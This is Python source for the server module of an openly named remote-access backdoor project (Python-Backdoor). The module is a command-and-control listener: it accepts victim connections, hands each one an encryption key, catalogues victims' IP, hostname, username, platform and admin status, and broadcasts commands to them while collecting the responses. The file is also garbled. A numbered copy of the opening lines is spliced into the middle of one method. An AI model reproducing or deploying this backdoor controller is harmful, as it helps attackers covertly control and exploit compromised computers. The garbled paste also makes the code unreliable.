"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import socket
import sys
from threading import Thread

from src import helper, errors
from src.encrypted_socket import EncryptedSocket
from src.definitions.commands import *


class Socket(EncryptedSocket):
    def __init__(self, port):
        super().__init__()

        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.new_key()

        self.listener = socket.socket()
        self.socket = None  # socket for a connection

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            self.logger.error(f"Error creating socket {e}")
            sys.exit(0)

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error() as e:
                self.logger.warning(f"Error binding socket {e}\nRetrying...")
                bind()

        bind()

        self.logger.info(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    self.socket, address = self.listener.accept()
                    self.socket.setblocking(1)  # no timeout

                    # first command is always the unencrypted key (as b64)
                    # not the best solution, but sending it raw without wrapped JSON will remove emphasis
                    self.send(base64.b64encode(self.key), False)
                    self.logger.debug(f"send key: {self.key}")

                    while True:
                        # wait for handshake
                        response = self.recv_json()
                        if response["key"] == CLIENT_HANDSHAKE:
                            break

                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True}}

                    if self.socket in self.connections:
                        self.addresses[self.connections.index(self.socket)]["connected"] = True
                    else:
                        self.connections.append(self.socket)
                        self.addresses.append(address)

                    self.logger.info(
                        f"Connection {len(self.connections)} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                except socket.error as err:
                    self.logger.error(f"Error accepting connection {err}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _, self.socket in enumerate(self.active_connections()):
                try:
                    self.send_json(CLIENT_EXIT)
                    self.socket.close()
                except socket.error:
                    pass
        else:
            self.logger.warning("No connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []
        self.socket = None

    def close_one(self, index):
        try:
            self.select(index)
            self.send_json(CLIENT_EXIT)
            self.socket.close()
        except socket.error:
            pass
        except errors.ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return

        self.addresses[self.connections.index(self.socket)]["connected"] = False
        self.socket = None

    def refresh(self):
        for _, self.socket in enumerate(self.active_connections()):
            try:
                self.send_json(CLIENT_HEARTBEAT)
            except socket.error:
                self.addresses[self.connections.index(self.socket)]["connected"] = False
                self.socket.close()

    def get_curr_address(self):
        return self.addresses[self.connections.index(self.socket)]

    def list(self, inactive=False):
        addresses = []
        # add ID
        for i, address in enumerate(self.addresses):
            if (inactive and not address["connected"]) or (not inactive and address["connected"]):
                address = {**{"index": str(i + 1)}, **address}
                addresses.append(address)

        if len(addresses) > 0:
            info = "\n"
            for key in addresses[0]:
                if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                    info += f"{helper.center(str(addresses[0][key]), str(key))}{4 * ' '}"

            info += "\n"

            for i, address in enumerate(addresses):
                for key in address:
                    if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                        info += f"{helper.center(key, address[key])}{4 * ' '}"

                if i < len(addresses) - 1:
                    info += "\n"

            return info
        else:
            _str = "inactive" if inactive else "active"

            self.logger.warning(f"No {_str} connections")
            return ""

    # connection id should be actual index + 1
    def select(self, connection_id):
        try:
            connection_id = int(connection_id)

            if connection_id < 1:
                raise Exception

            self.socket = self.connections[connection_id - 1]

            if not self.addresses[connection_id - 1]["connected"]:
                raise Exception"""
2
https://github.com/xp4xbox/Python-Backdoor
3
​
4
@author    xp4xbox
5
​
6
license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
7
"""
8
import base64
9
import socket
10
import sys
11
from threading import Thread
12
​
13
from src import helper, errors
14
from src.encrypted_socket import EncryptedSocket
15
from src.definitions.commands import *
16
​
17
​
18
class Socket(EncryptedSocket):
19
    def __init__(self, port):
20
        super().__init__()
21
​
22
        self.thread_accept = None
23
        self.port = port
24
        self.connections = []
25
        self.addresses = []
26
​
27
        self.new_key()
28
​
29
        self.listener = socket.socket()
30
        self.socket = None  # socket for a connection
31
​
32
        try:
33
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
34
                                     1)  # reuse a socket even if its recently closed
35
        except socket.error as e:
36
            self.logger.error(f"Error creating socket {e}")
37
            sys.exit(0)
38
​
39
    def listen_asych(self):
40
        def bind():
41
            try:
42
                self.listener.bind(("0.0.0.0", self.port))
43
                self.listener.listen(20)
44
            except socket.error() as e:
45
                self.logger.warning(f"Error binding socket {e}\nRetrying...")

        except Exception:
            raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")

    def send_all_connections(self, key, value, recv=False, recvall=False):
        if self.num_active_connections() > 0:
            for i, self.socket in enumerate(self.active_connections()):

                try:
                    self.send_json(key, value)
                except socket.error:
                    continue

                output = ""

                if recvall:
                    buffer = self.recv_json()["value"]["buffer"]
                    output = self.recvall(buffer).decode()
                elif recv:
                    output = self.recv_json()["value"]

                if output:
                    _info = self.addresses[self.connections.index(self.socket)]
                    self.logger.info(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
        else:
            self.logger.warning("No active connections")

    def active_connections(self):
        conns = []

        for i, address in enumerate(self.addresses):
            if address["connected"]:
                conns.append(self.connections[i])

        return conns

    def num_active_connections(self):
        count = 0

        for address in self.addresses:
            if address["connected"]:
                count += 1

        return count
